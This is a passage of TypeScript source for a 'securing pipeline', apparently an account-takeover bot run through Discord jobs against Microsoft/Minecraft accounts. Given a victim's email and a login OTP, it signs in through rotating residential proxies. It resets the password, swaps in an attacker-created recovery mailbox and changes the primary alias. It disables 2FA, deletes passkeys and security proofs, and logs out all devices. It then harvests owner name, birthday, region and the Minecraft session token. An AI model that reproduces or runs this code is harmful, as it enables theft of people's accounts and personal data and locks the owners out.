      `GenerateRecoveryCode failed status=${res.status} body=${JSON.stringify(data).slice(0, 200)}`,
    );
  }
  return data.recoveryCode;
}

function parseFirstmailPayload(data: Record<string, unknown>): RecoveryMailbox {
  let email = "";
  let password = "";
  if (data.email && data.password) {
    email = String(data.email);
    password = String(data.password);
  } else if (data.data && typeof data.data === "object") {
    const d = data.data as Record<string, string>;
    email = d.email;
    password = d.password;
  } else if (Array.isArray(data) && data[0] && typeof data[0] === "object") {
    const d = data[0] as Record<string, string>;
    email = d.email;
    password = d.password;
  }
  if (!email || !password) {
    throw new Error(`Unrecognized firstmail response: ${JSON.stringify(data).slice(0, 240)}`);
  }
  return {
    email,
    password,
    imapPassword: password,
    imapHost: "mail.firstmail.ltd",
    imapPort: 993,
    provider: "firstmail",
  };
}

/** Firstmail via Python httpx (Node fetch often fails on VPS / redirects). */
async function generateEmailViaPython(apiKey: string): Promise<RecoveryMailbox> {
  const script = `
import json, sys
try:
    import httpx
except ImportError:
    print(json.dumps({"ok": False, "error": "httpx missing"}))
    sys.exit(0)
key = (sys.argv[1] or "").strip()
if not key:
    print(json.dumps({"ok": False, "error": "empty FIRSTMAIL_API_KEY"}))
    sys.exit(0)
urls = [
    "https://api-tools.firstmail.ltd/lk/get/email?type=3",
    "https://api.firstmail.ltd/lk/get/email?type=3",
]
last = {"ok": False, "error": "no attempt"}
for url in urls:
    try:
        r = httpx.get(
            url,
            headers={"X-API-KEY": key, "Accept": "application/json"},
            timeout=30.0,
            follow_redirects=True,
        )
        try:
            data = r.json()
        except Exception:
            last = {"ok": False, "error": f"non-json {r.status_code} {r.text[:120]}", "url": url}
            continue
        detail = ""
        if isinstance(data, dict):
            detail = str(data.get("detail") or data.get("error") or data.get("message") or "")
        if r.status_code in (401, 403) or "not valid" in detail.lower() or "invalid" in detail.lower():
            print(json.dumps({
                "ok": False,
                "error": f"FIRSTMAIL_API_KEY rejected ({r.status_code}): {detail or r.text[:120]}",
                "url": url,
                "status": r.status_code,
                "fatal": True,
            }))
            sys.exit(0)
        if isinstance(data, dict) and (data.get("email") or (isinstance(data.get("data"), dict) and data["data"].get("email"))):
            print(json.dumps({"ok": True, "data": data, "url": url, "status": r.status_code}))
            sys.exit(0)
        last = {"ok": False, "error": f"bad body {r.status_code} {str(data)[:160]}", "url": url, "status": r.status_code}
    except Exception as e:
        last = {"ok": False, "error": str(e), "url": url}
print(json.dumps(last))
`.trim();

  const bins = process.platform === "win32" ? ["python", "py", "python3"] : ["python3", "python"];
  for (const bin of bins) {
    const result = await new Promise<{
      ok?: boolean;
      data?: Record<string, unknown>;
      error?: string;
      url?: string;
      status?: number;
    } | null>((resolve) => {
      const child = spawn(bin, ["-c", script, apiKey], {
        windowsHide: true,
        env: process.env,
        cwd: path.resolve(__secureDir, ".."),
      });
      let stdout = "";
      let stderr = "";
      child.stdout.on("data", (d) => {
        stdout += String(d);
      });
      child.stderr.on("data", (d) => {
        stderr += String(d);
      });
      child.on("error", () => resolve(null));
      child.on("close", () => {
        const line = stdout.trim().split(/\r?\n/).filter(Boolean).pop() || "";
        if (!line) {
          resolve({ ok: false, error: `empty firstmail py (${stderr.slice(0, 120)})` });
          return;
        }
        try {
          resolve(JSON.parse(line));
        } catch {
          resolve({ ok: false, error: `bad json: ${line.slice(0, 120)}` });
        }
      });
    });
    if (!result) continue;
    if (result.ok && result.data) {
      return parseFirstmailPayload(result.data);
    }
    throw new Error(
      `firstmail python failed: ${result.error || "unknown"} url=${result.url || "?"} status=${result.status ?? "?"}`,
    );
  }
  throw new Error("python unavailable for firstmail");
}

/** Unique recovery mailbox: Mailcow (preferred) → Firstmail fallback. */
async function generateEmail(): Promise<RecoveryMailbox> {
  const errors: string[] = [];

  if (mailcowConfigured()) {
    try {
      return await createMailcowMailbox();
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e);
      console.error("[secure] mailcow create failed:", msg);
      errors.push(`mailcow=${msg}`);
    }
  } else {
    errors.push(
      `mailcow=not configured (url=${!!(process.env.MAILCOW_API_URL || process.env.MAILCOW_URL)} key=${!!process.env.MAILCOW_API_KEY} domain=${!!process.env.MAILCOW_DOMAIN})`,
    );
  }

  const apiKey = (process.env.FIRSTMAIL_API_KEY || "").trim();
  if (apiKey) {
    try {
      return await generateEmailViaPython(apiKey);
    } catch (e) {
      errors.push(`firstmail=${e instanceof Error ? e.message : e}`);
    }
  }

  throw new Error(
    `No recovery mailbox available. Set MAILCOW_API_URL + MAILCOW_API_KEY + MAILCOW_DOMAIN. ${errors.join(" | ")}`,
  );
}

async function getEmailCode(
  mailbox: RecoveryMailbox,
  signal?: AbortSignal,
): Promise<string> {
  return readSecurityCodeFromImap(mailbox, signal, 90_000);
}

async function recover(
  jar: CookieJar,
  email: string,
  recoveryCode: string,
  mailbox: RecoveryMailbox,
  newPassword: string,
  signal?: AbortSignal,
): Promise<{ urlPost: string; recoveryCode: string }> {
  const newEmail = mailbox.email;
  try {
    if (signal?.aborted) throw new Error("Aborted before recovery");
    const res = await fetchWithJar(
      jar,
      `https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf&mn=${encodeURIComponent(email)}`,
      {
        headers: {
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        },
      },
      { timeoutMs: 35_000, followRedirects: true },
    );
    const text = await res.text();

    let serverData: Record<string, string> | null = null;
    const sdAssign = extractJsonAssignment(text, ["ServerData", "serverData"]);
    if (sdAssign) {
      serverData = sdAssign as Record<string, string>;
    } else {
      const m = text.match(/var\s+ServerData\s*=\s*\{/);
      if (m) {
        const openIdx = text.indexOf("{", m.index);
        const blob = extractBalancedObject(text, openIdx);
        if (blob) serverData = tryParseJsonBlob(blob) as Record<string, string> | null;
      }
    }
    if (!serverData) {
      const snip = text.replace(/\s+/g, " ").slice(0, 180);
      throw new Error(
        `recover ServerData missing status=${res.status} len=${text.length} snip=${snip}`,
      );
    }

    const rawToken = serverData.sRecoveryToken || serverData.recoveryToken || "";
    if (!rawToken) {
      throw new Error(
        `recover sRecoveryToken missing keys=${Object.keys(serverData).slice(0, 15).join(",")}`,
      );
    }
    const decodedToken = decodeURIComponent(String(rawToken)).replace(
      /\\u([0-9A-Fa-f]{4})/g,
      (_, hex) => String.fromCharCode(parseInt(hex, 16)),
    );
    let postUrl = "";
    try {
      postUrl = extract(text, /"urlPostSltToLogin":"([^"]+)"/);
    } catch {
      postUrl = (serverData.urlPostSltToLogin as string) || "";
    }

    const recRes = await fetchWithJar(jar, "https://account.live.com/API/Recovery/VerifyRecoveryCode", {
      method: "POST",
      headers: {
        "Content-type": "application/json; charset=utf-8",
        Accept: "application/json",
        canary: serverData.apiCanary,
        hpgid: "200284",
        hpgact: "0",
      },
      body: JSON.stringify({
        recoveryCode,
        code: recoveryCode,
        scid: 100103,
        token: decodedToken,
        uiflvr: 1001,
      }),
      signal,
    }, { timeoutMs: 25_000 });
    const recText = await recRes.text();
    let recJson: Record<string, string>;
    try {
      recJson = JSON.parse(recText) as Record<string, string>;
    } catch {
      throw new Error(`VerifyRecoveryCode non-json status=${recRes.status} body=${recText.slice(0, 160)}`);
    }
    if (!recJson.apiCanary) {
      throw new Error(
        `VerifyRecoveryCode failed status=${recRes.status} body=${recText.slice(0, 200)}`,
      );
    }

    const canary = recJson.apiCanary;
    const token = recJson.token;

    const sendCodeRes = await fetchWithJar(
      jar,
      "https://account.live.com/api/Proofs/SendOtt",
      {
        method: "POST",
        headers: {
          "Content-type": "application/json; charset=utf-8",
          Accept: "application/json",
          canary,
          hpgid: "200284",
          hpgact: "0",
        },
        body: JSON.stringify({
          associationType: "None",
          action: "VerifyNewProof",
          channel: "Email",
          cxt: "MP",
          proofId: newEmail,
          scid: 100103,
          token,
          uiflvr: 1001,
        }),
        signal,
      },
      { timeoutMs: 25_000 },
    );
    const sendText = await sendCodeRes.text();
    let sendCodeJson: Record<string, string>;
    try {
      sendCodeJson = JSON.parse(sendText) as Record<string, string>;
    } catch {
      throw new Error(`SendOtt non-json status=${sendCodeRes.status} body=${sendText.slice(0, 160)}`);
    }
    if (!sendCodeJson.apiCanary) {
      throw new Error(`SendOtt failed status=${sendCodeRes.status} body=${sendText.slice(0, 200)}`);
    }

    // Read MS security code from this job's unique mailbox (Mailcow / Firstmail)
    const otpCode = await getEmailCode(mailbox, signal);

    const verifyRes = await fetchWithJar(
      jar,
      "https://account.live.com/API/Proofs/VerifyCode",
      {
        method: "POST",
        headers: {
          "Content-type": "application/json; charset=utf-8",
          Accept: "application/json",
          canary: sendCodeJson.apiCanary,
          hpgid: "200284",
          hpgact: "0",
        },
        body: JSON.stringify({
          action: "VerifyOtc",
          proofId: newEmail,
          scid: 100103,
          token,
          uiflvr: 1001,
          code: otpCode,
        }),
      },
      { timeoutMs: 25_000 },
    );
    const verifyText = await verifyRes.text();
    let verifyJson: Record<string, string>;
    try {
      verifyJson = JSON.parse(verifyText) as Record<string, string>;
    } catch {
      throw new Error(`VerifyCode non-json status=${verifyRes.status} body=${verifyText.slice(0, 160)}`);
    }
    if (!verifyJson.apiCanary) {
      throw new Error(`VerifyCode failed status=${verifyRes.status} body=${verifyText.slice(0, 200)}`);
    }

    const finishRes = await fetchWithJar(
      jar,
      "https://account.live.com/API/Recovery/RecoverUser",
      {
        method: "POST",
        headers: {
          "Content-type": "application/json; charset=utf-8",
          Accept: "application/json",
          canary: verifyJson.apiCanary,
          hpgid: "200284",
          hpgact: "0",
        },
        body: JSON.stringify({
          contactEmail: newEmail,
          contactEpid: "",
          password: newPassword,
          passwordExpiryEnabled: 0,
          scid: 100103,
          token,
          uaid: "6b182876e51a429db0e2cff317076750",
          uiflvr: 1001,
        }),
      },
      { timeoutMs: 30_000 },
    );
    const finishText = await finishRes.text();
    let finishJson: Record<string, string>;
    try {
      finishJson = JSON.parse(finishText) as Record<string, string>;
    } catch {
      throw new Error(`RecoverUser non-json status=${finishRes.status} body=${finishText.slice(0, 160)}`);
    }

    if (finishJson.recoveryCode) {
      return { urlPost: postUrl, recoveryCode: finishJson.recoveryCode };
    }
    throw new Error(
      `RecoverUser no recoveryCode status=${finishRes.status} body=${finishText.slice(0, 220)}`,
    );
  } catch (e) {
    console.error("[secure] recover error:", e);
    throw e instanceof Error ? e : new Error(String(e));
  }
}

async function logoutAll(jar: CookieJar, apiCanary: string) {
  try {
    await fetchWithJar(jar, "https://account.live.com/API/Proofs/DeleteDevices", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        canary: apiCanary,
      },
      body: JSON.stringify({ uiflvr: 1001, uaid: "abd2ca2a346c43c198c9ca7e4255f3bc", scid: 100109, hpgid: 201030 }),
      redirect: "manual",
    });
  } catch {}
}

async function changePrimaryAlias(jar: CookieJar, emailName: string, apiCanary: string): Promise<boolean> {
  try {
    const canaryRes = await fetchWithJar(jar, "https://account.live.com/AddAssocId", {
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
    });
    const canaryText = await canaryRes.text();
    // URLSearchParams encodes once — do not pre-encode
    const addCanary = extract(canaryText, /name="canary" value="([^"]+)"/);

    await fetchWithJar(jar, "https://account.live.com/AddAssocId?ru=&cru=&fl=", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Origin: "https://account.live.com",
        Referer: "https://account.live.com/AddAssocId",
      },
      body: new URLSearchParams({
        canary: addCanary,
        PostOption: "LIVE",
        SingleDomain: "",
        UpSell: "",
        AddAssocIdOptions: "LIVE",
        AssociatedIdLive: emailName,
        DomainList: "outlook.com",
      }).toString(),
    });

    const pinfoRes = await fetchWithJar(jar, "https://account.live.com/API/MakePrimary", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        Accept: "application/json",
        hpgid: "200176",
        scid: "100141",
        uiflvr: "1001",
        canary: apiCanary,
      },
      body: JSON.stringify({
        aliasName: `${emailName}@outlook.com`,
        emailChecked: true,
        removeOldPrimary: true,
        uiflvr: 1001,
        scid: 100141,
        hpgid: 200176,
      }),
    });
    const pinfo = (await pinfoRes.json()) as Record<string, unknown>;
    if (pinfo.error) return false;
    return true;
  } catch {
    return false;
  }
}

const SECURE_HARD_TIMEOUT_MS = 10 * 60_000; // login + recovery + mailbox OTP + cleanup

export async function runSecureBot(
  jobId: string,
  discordId: string,
  config: SecureJobConfig,
  signal: AbortSignal,
): Promise<SecureResult | null> {
  const log = createLogger(jobId, discordId);
  const jar = new CookieJar();
  const hardAbort = new AbortController();
  const hardTimer = setTimeout(() => hardAbort.abort(), SECURE_HARD_TIMEOUT_MS);
  const onParentAbort = () => hardAbort.abort();
  if (signal.aborted) hardAbort.abort();
  else signal.addEventListener("abort", onParentAbort, { once: true });
  const runSignal = hardAbort.signal;

  const ensureAlive = () => {
    if (runSignal.aborted) throw new Error("Secure job aborted or timed out");
  };

  try {
    setStickyProxy(null);
    await log("info", `[secure] Starting securing pipeline for ${config.email}`);
    ensureAlive();

    // Phase 1: Login with OTP via residential proxies (python), fallback to node
    ensureAlive();
    await log(
      "info",
      `[secure] Logging in with OTP (proofLen=${(config.flowToken || "").length})...`,
    );

    let loggedIn = false;
    if (config.flowToken && config.code) {
      loggedIn = await loginWithCodeViaPython(
        jar,
        config.email,
        config.flowToken,
        config.code,
        log,
        runSignal,
      );
    }

    if (!loggedIn) {
      await log("info", "[secure] Python login unavailable/failed — trying node fallback...");
      // Still stick a residential proxy so post-login isn't bare VPS
      try {
        const { loadProxyUrls } = await import("./proxy-fetch.js");
        const urls = loadProxyUrls();
        if (urls.length) {
          setStickyProxy(urls[Math.floor(Math.random() * urls.length)]);
          await log("info", "[secure] sticky proxy set from pool for node fallback login");
        }
      } catch {
        /* ignore */
      }
      let liveData: LiveData;
      try {
        liveData = await getLiveData(jar);
      } catch (e) {
        const res = await fetchWithJar(jar, "https://login.live.com", { method: "POST" });
        const text = await res.text();
        const urlPost =
          text.match(/https:\/\/login\.live\.com\/ppsecure\/post\.srf\?[^"'\\\s]+/)?.[0] || "";
        const ppft =
          text.match(/name="PPFT"[^>]*value="([^"]+)"/)?.[1] ||
          text.match(/value=\\?"([^"]+)"/)?.[1] ||
          "";
        if (!urlPost || !ppft) {
          await log("error", `[secure] getLiveData failed: ${e instanceof Error ? e.message : e}`);
          return null;
        }
        liveData = { urlPost, ppft };
      }
      loggedIn = await loginWithCode(
        jar,
        config.email,
        config.flowToken,
        config.code,
        liveData.ppft,
        liveData.urlPost,
      );
    }

    if (!loggedIn) {
      await log(
        "error",
        "[secure] Failed to login — invalid/expired OTP, proof id mismatch, or MS blocked IP. Request a fresh code.",
      );
      return null;
    }
    await log("info", "[secure] Logged in successfully!");
    ensureAlive();

    // Phase 2: Run securing pipeline (post-login steps are best-effort where possible)
    const result: SecureResult = {
      mcUsername: config.mcUsername || "Unknown",
      mcEmail: config.email,
      newEmail: "Couldn't Change!",
      newPassword: "Couldn't Change!",
      recoveryCode: "Couldn't Change!",
      mailboxEmail: "",
      mailboxPassword: "",
      mailboxProvider: "",
      mailboxImapHost: "",
      ssid: null,
      capes: "No capes",
      method: "Not purchased",
      firstName: "Failed to Get",
      lastName: "Failed to Get",
      region: "Failed to Get",
      birthday: "Failed to Get",
    };

    ensureAlive();

    // ---- RECOVERY ASAP after login (skip AMC/MC until after — they burn session/time) ----
    let apiCanary = "";
    try {
      await log("info", "[secure] Getting cookies / apiCanary (via sticky proxy)...");
      apiCanary = await withTimeout(getCookies(jar), 40_000, "getCookies");
      await log("info", `[secure] apiCanary ok len=${apiCanary.length}`);
    } catch (e) {
      await log(
        "warn",
        `[secure] apiCanary failed (continuing): ${e instanceof Error ? e.message : e}`,
      );
    }

    ensureAlive();

    // AMRP soft elevates session for security APIs
    try {
      await log("info", "[secure] Getting TOS/AMRP elevation...");
      const t = await withTimeout(getT(jar), 25_000, "getT");
      if (t) {
        await withTimeout(getAMRP(jar, t), 20_000, "getAMRP");
        await log("info", "[secure] AMRP elevation done");
        // refresh canary after elevation
        try {
          const refreshed = await getCookies(jar);
          if (refreshed) apiCanary = refreshed;
        } catch {
          /* ignore */
        }
      } else {
        await log("warn", "[secure] No TOS t token — continuing without AMRP");
      }
    } catch (e) {
      await log("warn", `[secure] AMRP skipped: ${e instanceof Error ? e.message : e}`);
    }

    ensureAlive();
    await log("info", "[secure] Getting security information...");
    let mainEmail: string | undefined = config.email;
    let encryptedNetId: string | undefined;
    try {
      try {
        const refreshed = await withTimeout(getCookies(jar), 25_000, "refreshApiCanary");
        if (refreshed) apiCanary = refreshed;
      } catch (e) {
        await log(
          "warn",
          `[secure] canary refresh failed: ${e instanceof Error ? e.message : e}`,
        );
      }

      const secInfo = await withTimeout(
        securityInformation(jar, config.email),
        60_000,
        "securityInformation",
      );
      mainEmail = secInfo.email || config.email;
      encryptedNetId = secInfo.encryptedNetId;
      // canary may appear inside sec page blob
      const blobCanary = deepFindString(secInfo.raw, ["apiCanary", "canary"]);
      if (blobCanary && !apiCanary) {
        try {
          apiCanary = decodeUnicode(decodeURIComponent(blobCanary));
        } catch {
          apiCanary = decodeUnicode(blobCanary);
        }
      }
      await log(
        "info",
        `[secure] Sec info ok email=${mainEmail || "?"} netId=${encryptedNetId ? "yes" : "no"} canary=${apiCanary ? "yes" : "no"}`,
      );
    } catch (e) {
      await log(
        "error",
        `[secure] Failed to get security info: ${e instanceof Error ? e.message : e}`,
      );
    }

    if (mainEmail && encryptedNetId && apiCanary) {
      ensureAlive();
      try {
        await log("info", "[secure] Getting recovery code...");
        const recoveryCode = await withTimeout(
          getRecoveryCode(jar, apiCanary, encryptedNetId),
          30_000,
          "getRecoveryCode",
        );
        await log("info", `[secure] Got recovery code`);

        ensureAlive();
        await log(
          "info",
          `[secure] Creating unique recovery mailbox (mailcow=${mailcowConfigured()} firstmail=${!!process.env.FIRSTMAIL_API_KEY})...`,
        );
        const mailbox = await withTimeout(generateEmail(), 90_000, "generateEmail");
        await log(
          "info",
          `[secure] Mailbox ready provider=${mailbox.provider} email=${mailbox.email} imap=${mailbox.imapHost}`,
        );

        const newPassword =
          Math.random().toString(36).slice(2, 10) +
          Math.random().toString(36).slice(2, 6).toUpperCase() +
          "1!";

        await log("info", "[secure] Running recovery flow (waiting for mailbox OTP)...");
        const recoveryResult = await withTimeout(
          recover(jar, mainEmail, recoveryCode, mailbox, newPassword, runSignal),
          180_000,
          "recover",
        );

        result.newEmail = mailbox.email;
        result.newPassword = newPassword;
        result.recoveryCode = recoveryResult.recoveryCode;
        result.mailboxEmail = mailbox.email;
        result.mailboxPassword = mailbox.password;
        result.mailboxProvider = mailbox.provider;
        result.mailboxImapHost = mailbox.imapHost;
        await log(
          "info",
          `[secure] Account secured successfully! recoveryMailbox=${mailbox.email} mailboxPass=${mailbox.password}`,
        );

        // Refresh canary after recovery for alias / logout
        try {
          const refreshed = await getCookies(jar);
          if (refreshed) apiCanary = refreshed;
        } catch {
          /* ignore */
        }

        ensureAlive();
        await log("info", "[secure] Changing primary alias...");
        try {
          const aliasName = `auto${Math.random().toString(36).slice(2, 14)}`;
          const aliasChanged = await withTimeout(
            changePrimaryAlias(jar, aliasName, apiCanary),
            30_000,
            "changePrimaryAlias",
          );
          if (aliasChanged) {
            result.newEmail = `${aliasName}@outlook.com`;
            await log("info", `[secure] Primary alias changed to ${result.newEmail}`);
          } else {
            await log(
              "warn",
              "[secure] Failed to change primary alias - email recovery address preserved",
            );
          }
        } catch (e) {
          await log(
            "warn",
            `[secure] alias change skipped: ${e instanceof Error ? e.message : e}`,
          );
        }
      } catch (e) {
        await log(
          "error",
          `[secure] Recovery block failed: ${e instanceof Error ? e.message : e}`,
        );
      }
    } else {
      await log(
        "error",
        `[secure] Missing mainEmail/encryptedNetId/apiCanary for recovery (email=${mainEmail || "no"} netId=${!!encryptedNetId} canary=${!!apiCanary})`,
      );
    }

    const secured =
      result.newEmail !== "Couldn't Change!" &&
      result.newPassword !== "Couldn't Change!" &&
      result.recoveryCode !== "Couldn't Change!" &&
      !!result.newEmail &&
      !!result.newPassword &&
      !!result.recoveryCode;

    if (!secured) {
      await log(
        "error",
        "[secure] Recovery did not complete — refusing false success (credentials unchanged)",
      );
      return null;
    }

    // Optional enrichment AFTER success (must not fail the job)
    try {
      await log("info", "[secure] Getting AMC/owner info (optional)...");
      const verificationToken = await withTimeout(getAMC(jar), 30_000, "getAMC");
      if (verificationToken) {
        const ownerInfo = await getOwnerInfo(jar, verificationToken);
        if (ownerInfo) {
          result.firstName = ownerInfo.firstName;
          result.lastName = ownerInfo.lastName;
          result.region = ownerInfo.region;
          result.birthday = ownerInfo.birthday;
        }
      }
    } catch (e) {
      await log("warn", `[secure] owner info skipped: ${e instanceof Error ? e.message : e}`);
    }

    try {
      await log("info", "[secure] Getting Xbox/MC profile (optional)...");
      const xbl = await withTimeout(getXBL(jar), 40_000, "getXBL");
      if (xbl) {
        const ssid = await getSSID(xbl);
        if (ssid) {
          result.ssid = ssid;
          const capes = await getCapesList(ssid);
          if (capes) result.capes = capes;
          const profile = await getProfile(ssid);
          if (profile) result.mcUsername = profile;
          const method = await getMethod(ssid);
          if (method) result.method = method;
        }
      }
    } catch (e) {
      await log("warn", `[secure] MC profile skipped: ${e instanceof Error ? e.message : e}`);
    }

    // Best-effort cleanup AFTER recovery success — hard budget so we always return credentials.
    // On any timeout, drop remaining cleanup (hung ms_session must not block complete).
    const cleanupBudgetMs = 35_000;
    const cleanupDeadline = Date.now() + cleanupBudgetMs;
    let cleanupStop = false;
    const runCleanup = async (label: string, fn: () => Promise<unknown>, maxMs: number) => {
      if (cleanupStop || Date.now() >= cleanupDeadline) {
        await log("warn", `[secure] skip ${label} (cleanup budget / stop)`);
        return;
      }
      const ms = Math.min(maxMs, Math.max(2_000, cleanupDeadline - Date.now()));
      try {
        await log("info", `[secure] ${label}...`);
        await withTimeout(fn(), ms, label);
      } catch (e) {
        await log("warn", `[secure] ${label}: ${e instanceof Error ? e.message : e}`);
        cleanupStop = true;
        try {
          await closeMsSession();
        } catch {
          /* ignore */
        }
      }
    };

    if (apiCanary) {
      await runCleanup("Disabling 2FA", () => remove2FA(jar, apiCanary), 8_000);
      await runCleanup("Removing passkeys", () => removeZyger(jar, apiCanary), 8_000);
      await runCleanup("Removing security proofs", () => removeProofs(jar, apiCanary), 12_000);
    }
    await runCleanup("Removing third-party services", () => removeServices(jar), 10_000);
    if (apiCanary) {
      await runCleanup("Logging out all devices", () => logoutAll(jar, apiCanary), 6_000);
    }

    await log("info", "[secure] Securing pipeline complete!");
    return result;
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e);
    await log("error", `[secure] Pipeline failed: ${msg}`);
    return null;
  } finally {
    try {
      await closeMsSession();
    } catch {
      /* ignore */
    }
    setStickyProxy(null);
    clearTimeout(hardTimer);
    signal.removeEventListener("abort", onParentAbort);
  }
}
